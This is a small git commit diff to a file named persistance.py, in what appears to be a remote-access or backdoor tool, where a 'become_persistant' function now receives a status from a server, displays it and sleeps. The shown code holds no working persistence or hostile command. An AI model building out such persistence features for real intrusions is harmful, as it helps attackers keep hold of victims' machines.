363d9bfda29920310d44f7935f4bdd5195ac5e7d
fahadalisarwar1 <fahadalisarwar@gmail.com>
2020-04-05 08:29:05 -0400

    re

--- core/features/persistance.py
+++ core/features/persistance.py
@@ -1,6 +1,9 @@
 from core.utils import display_msg
+import time
 
 def become_persistant(server):
-    display_msg("Becoming Persistant")
-    
+    status = server.receive_data()
+    display_msg(status)
+    time.sleep(5)
+
     
